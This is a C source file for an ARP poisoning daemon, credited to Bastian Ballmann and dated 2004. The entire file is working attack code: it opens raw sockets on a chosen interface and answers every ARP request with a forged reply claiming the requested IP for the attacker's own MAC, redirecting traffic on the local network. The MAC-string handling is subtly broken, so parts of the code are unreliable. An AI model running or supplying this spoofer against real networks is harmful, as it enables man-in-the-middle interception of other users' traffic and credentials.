
/*
	A simple ARP poisoning daemon,
	Programmed by Bastian Ballmann
	Last update: 06.06.2004
	http://www.datenterrorist.de
*/

#include <sys/ioctl.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/ethernet.h>
#include <net/if.h>

#include <stdio.h>

#define ARPOP_REPLY 2
#define ARPHDR_ETHER 1
#define ETH_ALEN 6
#define IP_ALEN 4

// ARP Header Struktur
struct arphdr
{
	u_short hw_type;                    // hardware type
	u_short proto_type;                 // protocol type
	char ha_len;                        // hardware address length
	char pa_len;                        // protocol address length
	u_short opcode;                     // arp opcode
	unsigned char source_add[ETH_ALEN]; // source mac
	unsigned char source_ip[IP_ALEN];   // source ip
	unsigned char dest_add[ETH_ALEN];   // destination mac
	unsigned char dest_ip[IP_ALEN];     // destination ip
};

int main(int argc, char *argv[])
{
	int r_sock, w_sock;
	int packetsize = sizeof(struct ether_header) + sizeof(struct arphdr);
	char packet[packetsize];
	struct ether_header *eth = (struct ether_header *) packet;
	struct arphdr *arp = (struct arphdr *)(packet + sizeof(struct ether_header));
	unsigned char arppacket[sizeof(struct arphdr) + sizeof(struct ether_header)];
	struct ether_header *spoof_eth = (struct ether_header *)arppacket;
	struct arphdr *spoof_arp = (struct arphdr *)(arppacket + sizeof(struct ether_header));
	struct sockaddr addr;
	int one = 1;
	struct ifreq iface;
	char smac[ETH_ALEN];
	
	if (argc < 2) {
		printf("%s <device>\n", argv[0]);
		exit(1);
	}
	
	// Are you root?
	if (getuid() != 0) {
		printf("You must be root\n");
		exit(1);
	}
	
	// Raw Socket to read
	if ((r_sock = socket(AF_INET, SOCK_PACKET, htons(ETH_P_ARP))) < 0) {
		perror("socket");
		exit(1);
	}
	
	// Raw Socket to write
	if ((w_sock = socket(AF_INET, SOCK_PACKET, htons(ETH_P_ARP))) < 0) {
		perror("socket");
		exit(1);
	}
	
	// Read MAC Address
	strcpy(iface.ifr_name, argv[1]);
	
	if ((ioctl(r_sock, SIOCGIFHWADDR, &iface)) < 0) {
		perror("ioctl SIOCGIFHWADDR");
		exit(1);
	} else {
		sprintf(smac,"%02x:%02x:%02x:%02x:%02x:%02x",
		iface.ifr_hwaddr.sa_data[0] & 0xff,
		iface.ifr_hwaddr.sa_data[1] & 0xff,
		iface.ifr_hwaddr.sa_data[2] & 0xff,
		iface.ifr_hwaddr.sa_data[3] & 0xff,
		iface.ifr_hwaddr.sa_data[4] & 0xff,
		iface.ifr_hwaddr.sa_data[5] & 0xff);
	}
	
	// Wait for ARP requests and send ARP replies
	while (1) {
		read(r_sock,packet,packetsize);
		
		// Is that packet an ARP request?
		if ((eth->ether_type == 1544) && (arp->opcode == 256)) {
			// Ethernet Header
			memcpy(spoof_eth->ether_dhost, eth->ether_shost, ETH_ALEN); // Destination MAC
			memcpy(spoof_eth->ether_shost, smac, ETH_ALEN); // Source MAC
			spoof_eth->ether_type = htons(ETHERTYPE_ARP); // Packet type
			
			// ARP Header
			spoof_arp->hw_type = htons(ARPHDR_ETHER); // Hardware address type
			spoof_arp->proto_type = htons(ETH_P_IP); // Protocol address type
			spoof_arp->ha_len = ETH_ALEN; // Hardware address length
			spoof_arp->pa_len = IP_ALEN; // Protocol address length
			spoof_arp->opcode = htons(ARPOP_REPLY); // ARP operation type
			memcpy(spoof_arp->source_add, (char*)ether_aton(smac), ETH_ALEN); // Sender MAC
			memcpy(spoof_arp->source_ip, arp->dest_ip, IP_ALEN); // Source IP
			memcpy(spoof_arp->dest_add, arp->source_add, ETH_ALEN); // Target MAC
			memcpy(spoof_arp->dest_ip, arp->source_ip, IP_ALEN); // Target IP
			
			// Run packet! Run!
			
			strncpy(addr.sa_data, argv[1], sizeof(addr.sa_data));
			printf("arp reply %s is at %s\n", inet_ntoa(*(struct in_addr*)&spoof_arp->source_ip), smac);
			fflush(stdout);
			if(sendto(w_sock, arppacket, packetsize, 0, &addr, sizeof(addr)) < 0) {
				perror("send");
				exit(1);
			}
		}
	}
	
	close(r_sock);
	close(w_sock);
	
	return 0;
}

